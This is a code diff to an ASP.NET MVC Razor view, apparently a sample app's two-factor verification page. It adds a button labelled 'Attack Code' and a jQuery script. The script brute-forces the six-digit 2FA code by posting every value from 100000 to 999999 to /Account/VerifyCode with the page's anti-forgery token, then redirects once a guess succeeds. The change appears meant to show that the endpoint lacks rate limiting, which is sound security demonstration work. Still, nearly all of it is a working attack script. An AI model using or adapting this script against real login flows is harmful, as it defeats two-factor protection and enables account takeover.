@@ -32,6 +32,50 @@
     </div>
 }
 
+
+<div class="row">
+    <div class="col-md-4">
+        <h2>Attack Code</h2>
+        <p>
+            This will attempt to brute force the 2fa code.
+        </p>
+        <p><button id="codeButton" class="btn btn-default">Go</button></p>
+    </div>
+</div>
+
 @section Scripts {
     @Scripts.Render("~/bundles/jqueryval")
+<script>
+    $(function () {
+        $("#codeButton").click(function () {
+            var token = $("input[name=__RequestVerificationToken]").val();
+            var provider = $("#provider").val();
+            var code = 0;
+            for (var i = 100000; i < 1000000; i++) {
+                (function (i) {
+                    var data = {
+                        "__RequestVerificationToken": token,
+                        Code: i,
+                        provider: provider,
+                        RememberBrowser:"false"
+                    };
+                    if (i % 10000 == 0) {
+                        console.log("trying", i);
+                    }
+                    $.ajax({
+                        url: "/Account/VerifyCode",
+                        type: "POST",
+                        data: data,
+                        success: function (data, status, xhr) {
+                            var idx = data.indexOf("Enter Verification Code")
+                            if (idx < 0) {
+                                window.location = "/";
+                            }
+                        }
+                    });
+                })(i);
+            }
+        });
+    });
+</script>
 }
